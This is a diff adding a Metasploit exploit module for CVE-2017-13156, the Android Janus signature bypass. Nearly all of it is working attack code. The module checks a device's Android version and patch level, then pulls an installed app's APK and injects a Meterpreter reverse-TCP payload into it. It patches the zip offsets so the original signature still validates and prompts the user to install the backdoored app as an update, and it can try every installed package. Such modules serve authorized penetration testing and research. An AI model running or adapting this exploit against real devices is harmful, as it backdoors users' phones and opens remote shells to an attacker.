@@ -1,0 +1,162 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+require 'msf/core/payload/apk'
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ManualRanking
+
+  include Msf::Exploit::FileDropper
+  include Msf::Post::File
+  include Msf::Post::Android::Priv
+  include Msf::Payload::Android
+
+  def initialize(info={})
+    super( update_info( info, {
+      'Name'           => "Android Janus APK Signature bypass",
+      'Description'    => %q{
+        This module exploits CVE-2017-13156 in Android to install a payload into another
+        application. The payload APK will have the same signature and can be installed
+        as an update, preserving the existing data.
+        The vulnerability was fixed in the 5th December 2017 security patch, and was
+        additionally fixed by the APK Signature scheme v2, so only APKs signed with
+        the v1 scheme are vulnerable.
+        Payload handler is disabled, and a multi/handler must be started first.
+      },
+      'Author'         => [
+        'GuardSquare', # discovery
+        'V-E-O',       # proof of concept
+        'timwr',       # metasploit module
+        'h00die',      # metasploit module
+      ],
+      'References'     => [
+        [ 'CVE', '2017-13156' ],
+        [ 'URL', 'https://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures' ],
+        [ 'URL', 'https://github.com/V-E-O/PoC/tree/master/CVE-2017-13156' ],
+      ],
+      'DisclosureDate' => 'Jul 31 2017',
+      'SessionTypes'   => [ 'meterpreter' ],
+      'Platform'       => [ 'android' ],
+      'Arch'           => [ ARCH_DALVIK ],
+      'Targets'        => [ [ 'Automatic', {} ] ],
+      'DefaultOptions' => {
+        'PAYLOAD' => 'android/meterpreter/reverse_tcp',
+        'AndroidWakelock' => false, # the target may not have the WAKE_LOCK permission
+        'DisablePayloadHandler' => true,
+      },
+      'DefaultTarget'  => 0,
+      'Notes' => {
+        'SideEffects' => ['ARTIFACTS_ON_DISK', 'SCREEN_EFFECTS'],
+        'Stability' => ['SERVICE_RESOURCE_LOSS'], # ZTE youtube app won't start anymore
+      }
+    }))
+    register_options([
+      OptString.new('PACKAGE', [true, 'The package to target, or ALL to attempt all', 'com.phonegap.camerasample']),
+    ])
+    register_advanced_options [
+      OptBool.new('ForceExploit', [false, 'Override check result', false]),
+    ]
+  end
+
+  def check
+    os = cmd_exec("getprop ro.build.version.release")
+    unless Gem::Version.new(os).between?(Gem::Version.new('5.1.1'), Gem::Version.new('8.0.0'))
+      vprint_error "Android version #{os} is not vulnerable."
+      return CheckCode::Safe
+    end
+    vprint_good "Android version #{os} appears to be vulnerable."
+
+    patch = cmd_exec('getprop ro.build.version.security_patch')
+    if patch.empty?
+      print_status 'Unable to determine patch level.  Pre-5.0 this is unaccessible.'
+    elsif patch > '2017-12-05'
+      vprint_error "Android security patch level #{patch} is patched."
+      return CheckCode::Safe
+    else
+      vprint_good "Android security patch level #{patch} is vulnerable"
+    end
+
+    CheckCode::Appears
+  end
+
+  def exploit
+
+    def infect(apkfile)
+      unless apkfile.start_with?("package:")
+        fail_with Failure::BadConfig, 'Unable to locate app apk'
+      end
+      apkfile = apkfile[8..-1]
+      print_status "Downloading APK: #{apkfile}"
+      apk_data = read_file(apkfile)
+
+      begin
+        # Create an apk with the payload injected
+        apk_backdoor = ::Msf::Payload::Apk.new
+        apk_zip = apk_backdoor.backdoor_apk(nil, payload.encoded, false, false, apk_data, false)
+
+        # Extract the classes.dex
+        dex_data = ''
+        Zip::File.open_buffer(apk_zip) do |zipfile|
+          dex_data = zipfile.read("classes.dex")
+        end
+        dex_size = dex_data.length
+
+        # Fix the original APKs zip file code directory
+        cd_end_addr = apk_data.rindex("\x50\x4b\x05\x06")
+        cd_start_addr = apk_data[cd_end_addr+16, cd_end_addr+20].unpack("V")[0]
+        apk_data[cd_end_addr+16...cd_end_addr+20] = [ cd_start_addr+dex_size ].pack("V")
+        pos = cd_start_addr
+        while pos && pos < cd_end_addr
+          offset = apk_data[pos+42, pos+46].unpack("V")[0]
+          apk_data[pos+42...pos+46] = [ offset+dex_size ].pack("V")
+          pos = apk_data.index("\x50\x4b\x01\x02", pos+46)
+        end
+
+        # Prepend the new classes.dex to the apk
+        out_data = dex_data + apk_data
+        out_data[32...36] = [ out_data.length ].pack("V")
+        out_data = fix_dex_header(out_data)
+
+        out_apk = "/sdcard/#{Rex::Text.rand_text_alphanumeric 6}.apk"
+        print_status "Uploading APK: #{out_apk}"
+        write_file(out_apk, out_data)
+        register_file_for_cleanup(out_apk)
+        print_status "APK uploaded"
+
+        # Prompt the user to update the APK
+        session.appapi.app_install(out_apk)
+        print_status "User should now have a prompt to install an updated version of the app"
+        true
+      rescue => e
+        print_error e.to_s
+        false
+      end
+    end
+
+    unless [CheckCode::Detected, CheckCode::Appears].include? check
+      unless datastore['ForceExploit']
+        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
+      end
+      print_warning 'Target does not appear to be vulnerable'
+    end
+
+    if datastore["PACKAGE"] == 'ALL'
+      vprint_status('Finding installed packages (this can take a few minutes depending on list of installed packages)')
+      apkfiles = []
+      all = cmd_exec("pm list packages").split("\n")
+      c = 1
+      all.each do |package|
+        package = package.split(':')[1]
+        vprint_status("Attempting exploit of apk #{c}/#{all.length} for #{package}")
+        c += 1
+        next if ['com.metasploit.stage', # avoid injecting into ourself
+                ].include? package # This was left on purpose to be expanded as need be for testing
+        result = infect(cmd_exec("pm path #{package}"))
+        break if result
+      end
+    else
+      infect(cmd_exec("pm path #{datastore["PACKAGE"]}"))
+    end
+  end
+end
